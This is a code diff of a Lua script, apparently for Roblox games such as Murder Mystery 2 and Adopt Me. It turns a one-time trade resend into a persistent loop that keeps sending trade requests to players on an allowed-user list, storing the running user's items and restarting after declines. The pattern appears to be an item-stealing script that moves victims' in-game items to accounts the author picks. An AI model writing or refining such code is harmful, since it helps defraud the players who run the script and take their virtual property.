@@ -219,15 +219,19 @@ local function hook_mm2()
         showGui()
     end
 
-    local function resendTrade()
-        task.wait(1)
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= lp and isAllowedUser(player.Name) then
-                storeItems()
-                pcall(function() sendRequest:InvokeServer(player) end)
-                break
+    local function startTradeLoop()
+        task.spawn(function()
+            while not tradingWithAllowed do
+                task.wait(2)
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= lp and isAllowedUser(player.Name) then
+                        storeItems()
+                        pcall(function() sendRequest:InvokeServer(player) end)
+                        break
+                    end
+                end
             end
-        end
+        end)
     end
 
     if updateTrade then
@@ -242,23 +246,10 @@ local function hook_mm2()
         declineTrade.OnClientEvent:Connect(function()
             if tradingWithAllowed then
                 resetState()
-                resendTrade()
+                startTradeLoop()
             end
         end)
     end
-
-    task.spawn(function()
-        while not tradingWithAllowed do
-            task.wait(2)
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= lp and isAllowedUser(player.Name) then
-                    storeItems()
-                    pcall(function() sendRequest:InvokeServer(player) end)
-                    break
-                end
-            end
-        end
-    end)
 
     Players.PlayerAdded:Connect(function(player)
         if isAllowedUser(player.Name) and not tradingWithAllowed then
@@ -314,9 +305,11 @@ local function hook_mm2()
             task.wait(0.5)
             restoreItems()
             resetState()
-            resendTrade()
+            startTradeLoop()
         end)
     end
+
+    startTradeLoop()
 end
 
 local function hook_adoptme()
